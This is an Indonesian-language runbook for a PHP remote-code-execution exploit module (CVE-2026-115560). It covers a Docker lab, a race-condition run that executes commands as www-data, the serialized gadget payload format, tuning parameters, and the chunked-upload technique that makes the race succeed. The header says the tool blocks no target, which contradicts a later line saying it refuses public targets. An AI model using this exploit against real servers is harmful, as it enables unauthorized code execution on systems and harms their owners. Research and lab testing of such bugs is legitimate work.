# RUNBOOK — modul x115560 (CVE-2026-115560)

> Modul: `lib/cve115560.py` · Lab image: `p2s115560:lab` (php:8.4.27-apache,
> app vuln pola googlesky — dikredit). Tool TIDAK memblokir target apa pun:
> scope (loopback/private/public) dicetak sebagai informasi; batas penggunaan
> = keputusan operator / RoE program (konsisten dengan detect/exploit 109619).

## Prasyarat bug (ketiganya, dari php.net advisory 23 Okt)
1. server ini `session.serialize_handler` = `php_binary`|`php_serialize`
2. APP melakukan `ini_set('session.serialize handler','php')` sebelum `session_start()`
3. `session.upload_progress.enabled = On` (default)

fix-floor PHP2Shell (8.2.35/8.3.36/8.4.27/8.5.12) **TIDAK** menutup ini —
tervalidasi: lab ini berjalan di 8.4.27 (patched-php2shell) dan tetap
tereksekusi.

## 1. Bangun & nyalakan lab

```bash
cd "/run/media/lota1337/AarSSDaputra/p2s-lab/lab115560"
docker build -t p2s115560:lab .
docker rm -f p2s-115560 2>/dev/null
docker run -d --name p2s-115560 -p 127.0.0.1:9404:80 p2s115560:lab
sleep 3
curl -s http://127.0.0.1:9404/info.php
# {"lab":"115560","serialize_handler_runtime":"php_serialize",
#  "upload_progress":"1","php":"8.4.27"}   ← prasyarat #1+#3 terpasang
```

## 2. Unit test (murni, tanpa network)

```bash
cd /home/lota1337/python/php2shell && source /home/lota1337/myenv/bin/activate
python -m unittest tests.test_cve115560 -v
```

## 3. Race producer → consumer (bukti RCE di 8.4.27)

```bash
python - <<'PY'
import sys; sys.path.insert(0, '.')
from lib.cve115560 import RaceConfig, run_race
cfg = RaceConfig(url="http://127.0.0.1:9404/index.php", cmd="id",
                 total_mb=4, chunk_kb=16, chunk_delay=0.10, duration=90.0)
print(run_race(cfg))
PY
# hasil sukses yang pernah terukur:
# {'success': True, 'reads': 3, 'proof': 'uid=33(www-data) … PROOF-115560'}
```

Kontrol:
```bash
# noswitch.php (tanpa ini_set) = aman → ini bukti prasyarat #2 wajib
# verifikasi manual file bukti:
docker exec p2s-115560 cat /var/www/html/p/R.txt
```

## 4. Parameter tuning (RaceConfig)

| Param | Default | Catatan |
|---|---|---|
| total_mb | 4 | besar file part; makin besar makin panjang window (dibatasi post_max_size) |
| chunk_kb / chunk_delay | 16 / 0.10 | trickle pacing; jeda mempertahankan flush progress |
| duration | 90 | batas race |
| poll | 0.07 | interval consumer |
| out_path | p/R.txt | path file bukti (relatif docroot) |

## 5. Pembersihan

```bash
docker rm -f p2s-115560
docker rmi p2s115560:lab
```

## Catatan pembelajaran dari pembangunan (pelajari sebelum ubah kode)

1. **http.client putrequest/send** untuk body trickle besar → **Apache 400**.
   Element requests dengan generator `data=` jalan (200, sinyal decode failure
   tampil). TAPI Content-Length precomputed membuat requests **buffered
   sekaligus** → session file producer tetap 0 byte.
2. **Solusi yang terbukti: `data=gen()` + `Transfer-Encoding: chunked` TANPA
   Content-Length** → tiap `yield` benar-benar dikirim bertahap → session file
   tumbuh (395 B sesaat setelah start) → consumer menang di **reads=3**.
3. Payload: key `upload_progress_|O:9:"LabGadget":2:{s:3:"cmd";…;s:3:"out";…}`
   → `php` decoder split di `|` pertama → unserialize → `__destruct` menulis
   `shell_exec(cmd)` ke docroot.
4. Sinyal sisi server sukses: PHP Warning **"session_start(): Failed to decode
   session object. Session has been destroyed"** (destruct tetap fire walau
   decode failure — jalur googlesky: `PHP_VAR_UNSERIALIZE_DESTROY` di kedua
   jalur exit).
5. Live target publik: **modul menolak**; check pasif + audit kode aplikasi
   (`ini_set.*serialize_handler`) adalah jalur yang sah untuk produksi.
